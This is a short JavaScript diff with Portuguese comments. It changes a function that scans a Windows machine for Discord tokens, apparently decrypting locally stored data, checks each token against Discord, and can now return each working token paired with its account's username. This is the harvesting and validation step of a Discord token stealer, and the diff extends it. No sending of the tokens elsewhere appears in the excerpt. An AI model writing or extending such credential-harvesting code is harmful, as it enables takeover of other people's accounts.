@@ -91,9 +91,12 @@ function descriptografarAES(buffer, chave) {
 
 /**
  * Busca tokens do Discord no Windows
- * @returns {Promise<string[]>} - Array de tokens encontradas
+ * @param {{comUsuario?: boolean}} [opcoes] - Com `comUsuario: true`, devolve
+ *   [{token, usuario}] em vez de string[] (usuario = nome validado no Discord).
+ * @returns {Promise<string[]|Array<{token:string, usuario:string}>>}
  */
-async function buscarTokensWindows() {
+async function buscarTokensWindows(opcoes = {}) {
+	const comUsuario = !!(opcoes && opcoes.comUsuario);
 	if (process.platform !== 'win32') {
 		return [];
 	}
@@ -167,7 +170,8 @@ async function buscarTokensWindows() {
 	const tokens = [];
 	for (const candidato of candidatos) {
 		const usuario = await validarToken(candidato);
-		if (usuario) tokens.push(candidato);
+		if (!usuario) continue;
+		tokens.push(comUsuario ? { token: candidato, usuario } : candidato);
 	}
 
 	return tokens;
